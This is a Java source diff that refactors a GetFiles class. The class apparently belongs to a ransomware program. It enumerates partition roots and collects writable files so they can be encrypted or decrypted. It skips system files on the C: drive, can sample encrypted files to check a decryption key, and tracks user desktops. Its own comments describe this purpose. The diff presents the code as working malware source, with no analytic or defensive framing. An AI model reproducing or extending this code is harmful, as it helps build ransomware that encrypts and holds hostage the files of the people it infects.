@@ -9,30 +9,41 @@ import java.util.Arrays;
 import java.util.Objects;
 
 public class GetFiles {
-    private final File[] drivers;
+    private final File[] roots;
     private final ArrayList<File> desktops;
     private final String os;
 
     public GetFiles(String os) {
-        drivers = scanDrivers();
+        roots = scanRoots();
         desktops = new ArrayList<>();
         this.os = os;
     }
 
-    private File[] scanDrivers() { // Get partitions
+    private File[] scanRoots() { // Get partitions
         return File.listRoots();
     }
 
-    public File[] getDrivers() {
-        return drivers;
+    /**
+     * Get the roots files
+     * @return array from roots
+     */
+    public File[] getRoots() {
+        return roots;
     }
 
-    public ArrayList<File> scanFiles(File drive, To to, boolean isVerify) {
-        ArrayList<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(drive.listFiles())));
-
+    /**
+     * Get all writable files from the file path such as root
+     * @param root The root file
+     * @param to Why do you want to scan files?, to decrypt or encrypt them
+     * @param isVerify In case of decryption, do you want to get a sample just to verify the key,
+     *                 or do you want to get all the encrypted files?
+     * @return ِArrayList It contains all files that can be encrypted, decrypted, or sampled
+     */
+    public ArrayList<File> scanFiles(File root, To to, boolean isVerify) {
+        ArrayList<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(root.listFiles())));
         int i = 0;
         boolean isEnd;
-        boolean isSystemDrive = (drive.toString().equals("C:\\"));
+        boolean isSystemDrive = (root.toString().equals("C:\\"));
         if (isSystemDrive) {
             // delete files system
             for (int n = 0; n < files.size(); n++)
@@ -81,6 +92,10 @@ public class GetFiles {
         return files;
     }
 
+    /**
+     * Get the desktops
+     * @return array list from desktops
+     */
     public ArrayList<File> getDesktops() {
         return desktops;
     }
